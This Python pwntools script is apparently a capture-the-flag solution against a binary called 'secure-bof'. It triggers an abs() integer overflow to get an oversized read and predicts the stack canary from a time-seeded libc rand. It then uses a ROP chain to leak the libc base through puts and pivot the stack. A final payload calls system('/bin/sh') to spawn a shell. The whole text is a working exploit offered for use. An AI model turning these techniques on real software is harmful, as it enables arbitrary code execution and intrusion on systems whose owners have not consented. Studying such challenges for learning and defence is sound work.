from pwn import *
from ctypes import *

context.arch = 'amd64'

sh = process('./secure-bof')
libc = ELF('./libc-2.27.so')
C = CDLL("./libc-2.27.so")
C.srand(C.time(None))

# abs(0x80000000) still 0x80000000 !!! (2's complement)
sh.sendline(str(0x80000000))
sleep(0.1)

# Now we can input 0x80000000 bytes, do buffer overflow
canary = ''
for i in range(0x10):
    canary += chr(C.rand() & 0xff)

pop_rdi     = 0x400ba3
pop_rsi_r15 = 0x400ba1
pop_rbp     = 0x400878
read_plt    = 0x4007a0
puts_plt    = 0x400780
main_got    = 0x601ff0 # __libc_start_main@got
mybuf       = 0x602508
leave_ret   = 0x4009e2

# Leak libc, and let us input again
ropchain = flat(
    pop_rdi,
    main_got,
    puts_plt,
    pop_rdi,
    0x0,
    pop_rsi_r15,
    mybuf,
    0x0,
    read_plt,
    pop_rdi,
    mybuf + 16,
    pop_rbp,
    mybuf,
    leave_ret # mov rsp, rbp; pop rbp; ret, rsp will be mybuf
)

payload = ''
payload += 'a' * 0x100
payload += canary
payload += 'a' * 8 * 3
payload += ropchain         # return address
sh.sendline(payload)
sleep(0.1)

msg = sh.recvuntil(':)')
msg2 = sh.recvuntil(':)\n')
libc.address = u64(sh.recv(6).ljust(8, '\0')) - 137904
print(msg)
print(msg2)
print('libc base: %s' % hex(libc.address))

payload = ''
payload += p64(0x602700)
payload += p64(libc.symbols['system'])
payload += '/bin/sh\x00'
sh.sendline(payload)

sh.interactive()
